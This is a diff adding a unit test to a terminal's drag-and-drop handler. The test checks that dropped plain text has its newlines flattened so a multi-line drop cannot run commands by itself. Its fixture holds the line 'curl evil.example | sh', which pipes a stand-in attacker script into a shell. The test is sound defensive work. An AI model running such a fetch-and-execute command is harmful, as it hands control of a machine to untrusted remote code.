@@ -182,6 +182,28 @@ describe("attachTerminalDrop", () => {
     handle.detach();
   });
 
+  it("HTML5 drop of plain text flattens newlines before writing", () => {
+    const { gridEl, paneEl } = makeGridWithPane("pty-5");
+    const router = { getActiveHost: (): HTMLElement | null => gridEl };
+    const handle = attachTerminalDrop({ gridEl, router });
+
+    const dt = fakeDataTransfer({
+      plain: "ls\ncurl evil.example | sh\n",
+    });
+
+    const drop = new Event("drop", { bubbles: true, cancelable: true });
+    Object.defineProperty(drop, "dataTransfer", { value: dt });
+    Object.defineProperty(drop, "target", { value: paneEl, configurable: true });
+
+    paneEl.dispatchEvent(drop);
+
+    expect(ptyClient.ptyWrite).toHaveBeenCalledExactlyOnceWith(
+      "pty-5",
+      "ls curl evil.example | sh ",
+    );
+    handle.detach();
+  });
+
   it("detach removes listeners and clears highlight", () => {
     const { gridEl, paneEl } = makeGridWithPane("pty-4");
     const router = { getActiveHost: (): HTMLElement | null => gridEl };
